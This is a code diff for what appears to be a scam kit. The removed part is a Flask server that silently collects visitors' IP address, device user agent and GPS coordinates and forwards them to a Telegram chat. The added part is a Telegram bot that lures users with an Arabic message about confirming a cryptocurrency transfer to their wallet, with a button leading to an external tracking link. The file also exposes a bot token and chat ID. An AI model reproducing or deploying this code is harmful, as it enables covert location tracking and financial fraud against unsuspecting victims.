@@ -1,33 +1,22 @@
-from flask import Flask, request, jsonify, send_from_directory
-import requests
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-app = Flask(__name__)
+BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
+REDIRECT_URL = 'https://boot-eg8h.onrender.com'
 
-BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"
-CHAT_ID = "7485197107"
+bot = telebot.TeleBot(BOT_TOKEN)
 
-@app.route("/")
-def index():
-    return send_from_directory('.', 'index.html')
+@bot.message_handler(commands=['start'])
+def welcome(message):
+    keyboard = InlineKeyboardMarkup()
+    btn = InlineKeyboardButton("✅ تأكيد تحويل الأموال للمحفظة", url=REDIRECT_URL)
+    keyboard.add(btn)
 
-@app.route("/send", methods=["POST"])
-def send():
-    data = request.get_json()
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-    user_agent = data.get("userAgent")
-    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
+    text = (
+        "💸 *مرحبًا بك في بوت التحويل بالعملات الرقمية*\n"
+        "🔐 لتأكيد العملية، اضغط على الزر أدناه 👇"
+    )
+    bot.send_message(message.chat.id, text, reply_markup=keyboard, parse_mode='Markdown')
 
-    message = f"📡 تم الدخول إلى رابط تحويل العملات:\n\n" \
-              f"🌍 IP: {ip_address}\n📱 الجهاز: {user_agent}\n" \
-              f"📍 الموقع: https://maps.google.com/?q={latitude},{longitude}"
-
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-        "chat_id": CHAT_ID,
-        "text": message
-    })
-
-    return jsonify({"status": "sent"}), 200
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=10000)
+print("🤖 Bot is running...")
+bot.infinity_polling()
